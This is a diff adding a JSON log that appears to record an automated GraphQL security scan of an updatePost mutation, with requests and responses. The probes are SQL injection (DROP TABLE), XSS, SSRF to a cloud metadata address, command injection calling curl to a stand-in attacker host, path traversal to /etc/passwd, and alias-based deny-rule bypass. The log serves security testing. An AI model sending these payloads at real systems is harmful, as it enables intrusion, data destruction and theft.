@@ -1,0 +1,407 @@
+[
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"1\", input: { title: \"Robert'); DROP TABLE posts; --\", body: \"Testing SQL injection in body\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "sql_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.822,
+    "timestamp": "2025-10-03T04:56:31.251448Z",
+    "count": 1,
+    "vulnerability_type": "sql_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "1",
+          "title": "Robert'); DROP TABLE posts; --",
+          "body": "Testing SQL injection in body",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"2\", input: { title: \"Normal title\", body: \"<script>alert('XSS from body')</script>\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "xss_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.483,
+    "timestamp": "2025-10-03T04:56:33.387576Z",
+    "count": 2,
+    "vulnerability_type": "xss_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "2",
+          "title": "Normal title",
+          "body": "<script>alert('XSS from body')</script>",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"3\", input: { title: \"Fetch test\", body: \"http://169.254.169.254/latest/meta-data/; attempted SSRF\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n      website\n    }\n  }\n}\n",
+      "vulnerability_type": "ssrf_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.783,
+    "timestamp": "2025-10-03T04:56:36.270972Z",
+    "count": 3,
+    "vulnerability_type": "ssrf_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "3",
+          "title": "Fetch test",
+          "body": "http://169.254.169.254/latest/meta-data/; attempted SSRF",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham",
+            "website": "hildegard.org"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"4\", input: { title: \"`cat /etc/passwd`\", body: \"Testing OS command injection vector: $(curl http://attacker.example/p) \" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "os_command_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.467,
+    "timestamp": "2025-10-03T04:56:38.992389Z",
+    "count": 4,
+    "vulnerability_type": "os_command_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "4",
+          "title": "`cat /etc/passwd`",
+          "body": "Testing OS command injection vector: $(curl http://attacker.example/p) ",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"5\", input: { title: \"../../etc/passwd\", body: \"Path traversal attempt in title and body: ../../var/log/auth.log\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "path_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.471,
+    "timestamp": "2025-10-03T04:56:42.089974Z",
+    "count": 5,
+    "vulnerability_type": "path_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "5",
+          "title": "../../etc/passwd",
+          "body": "Path traversal attempt in title and body: ../../var/log/auth.log",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"6\", input: { title: \"<img src=x onerror=\\\"alert('html')\\\">\", body: \"<div onclick=\\\"alert('injected')\\\">Click me</div>\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "html_injection"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.713,
+    "timestamp": "2025-10-03T04:56:44.861625Z",
+    "count": 6,
+    "vulnerability_type": "html_injection",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "6",
+          "title": "<img src=x onerror=\"alert('html')\">",
+          "body": "<div onclick=\"alert('injected')\">Click me</div>",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"7\", input: { title: \"Attempt AC bypass\", body: \"Non-aliased mutation call to check deny rules\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_non_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.723,
+        "timestamp": "2025-10-03T04:56:48.550979Z",
+        "response_body": {
+          "data": {
+            "updatePost": {
+              "id": "7",
+              "title": "Attempt AC bypass",
+              "body": "Non-aliased mutation call to check deny rules",
+              "user": {
+                "id": "1",
+                "name": "Leanne Graham"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.813,
+        "timestamp": "2025-10-03T04:56:49.363773Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "7",
+              "title": "Attempt AC bypass (aliased)",
+              "body": "Aliased field name to test deny/ACL bypass",
+              "user": {
+                "id": "1",
+                "name": "Leanne Graham"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 7,
+    "timestamp": "2025-10-03T04:56:49.363837Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.464,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  s: updatePost(id: \"7\", input: { title: \"Attempt AC bypass (aliased)\", body: \"Aliased field name to test deny/ACL bypass\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n  }\n}\n",
+      "vulnerability_type": "query_deny_bypass_aliased"
+    },
+    "query_deny_bypass_responses": {
+      "non_aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.746,
+        "timestamp": "2025-10-03T04:56:53.563239Z",
+        "response_body": {
+          "data": {
+            "updatePost": {
+              "id": "7",
+              "title": "Attempt AC bypass",
+              "body": "Non-aliased mutation call to check deny rules",
+              "user": {
+                "id": "1",
+                "name": "Leanne Graham"
+              }
+            }
+          }
+        }
+      },
+      "aliased": {
+        "response_status": 200,
+        "request_time_seconds": 0.487,
+        "timestamp": "2025-10-03T04:56:54.050008Z",
+        "response_body": {
+          "data": {
+            "s": {
+              "id": "7",
+              "title": "Attempt AC bypass (aliased)",
+              "body": "Aliased field name to test deny/ACL bypass",
+              "user": {
+                "id": "1",
+                "name": "Leanne Graham"
+              }
+            }
+          }
+        }
+      }
+    },
+    "vulnerability_type": "query_deny_bypass",
+    "count": 8,
+    "timestamp": "2025-10-03T04:56:54.050088Z",
+    "success": false,
+    "negative_success": false,
+    "retry_query": "\n    query {\n      episodesByIds(ids: [1]) {\n        id\n        name\n      }\n    }\n    ",
+    "retry_status": 400,
+    "retry_time_seconds": 0.618,
+    "retry_response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"episodesByIds\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 7
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    }
+  },
+  {
+    "query": {
+      "query": "\nquery {\n  updatePost {\n    types {\n      name\n      fields {\n        name\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "introspection"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.461,
+    "timestamp": "2025-10-03T04:56:56.931281Z",
+    "count": 9,
+    "vulnerability_type": "introspection",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"updatePost\" on type \"Query\".",
+          "locations": [
+            {
+              "line": 3,
+              "column": 3
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"8\", input: { title: \"Check suggestions\", body: \"Requesting misspelled fields to elicit suggestions\" }) {\n    id\n    titel\n    bdy\n    usr {\n      idd\n      nme\n    }\n  }\n}\n",
+      "vulnerability_type": "field_suggestions"
+    },
+    "response_status": 400,
+    "request_time_seconds": 0.5,
+    "timestamp": "2025-10-03T04:56:59.488697Z",
+    "count": 10,
+    "vulnerability_type": "field_suggestions",
+    "response_body": {
+      "errors": [
+        {
+          "message": "Cannot query field \"titel\" on type \"Post\". Did you mean \"title\"?",
+          "locations": [
+            {
+              "line": 5,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"bdy\" on type \"Post\". Did you mean \"body\" or \"id\"?",
+          "locations": [
+            {
+              "line": 6,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        },
+        {
+          "message": "Cannot query field \"usr\" on type \"Post\". Did you mean \"user\"?",
+          "locations": [
+            {
+              "line": 7,
+              "column": 5
+            }
+          ],
+          "extensions": {
+            "code": "GRAPHQL_VALIDATION_FAILED"
+          }
+        }
+      ]
+    },
+    "success": false,
+    "negative_success": false
+  },
+  {
+    "query": {
+      "query": "\nmutation {\n  updatePost(id: \"9\", input: { title: \"Updated title - basic\", body: \"Simple update body for a valid basic call\" }) {\n    id\n    title\n    body\n    user {\n      id\n      name\n    }\n    comments {\n      meta {\n        totalCount\n      }\n      links {\n        first {\n          page\n          limit\n        }\n      }\n    }\n  }\n}\n",
+      "vulnerability_type": "basic_call"
+    },
+    "response_status": 200,
+    "request_time_seconds": 0.832,
+    "timestamp": "2025-10-03T04:57:02.880175Z",
+    "count": 11,
+    "vulnerability_type": "basic_call",
+    "response_body": {
+      "data": {
+        "updatePost": {
+          "id": "9",
+          "title": "Updated title - basic",
+          "body": "Simple update body for a valid basic call",
+          "user": {
+            "id": "1",
+            "name": "Leanne Graham"
+          },
+          "comments": {
+            "meta": null,
+            "links": null
+          }
+        }
+      }
+    },
+    "success": true,
+    "negative_success": false
+  }
+]
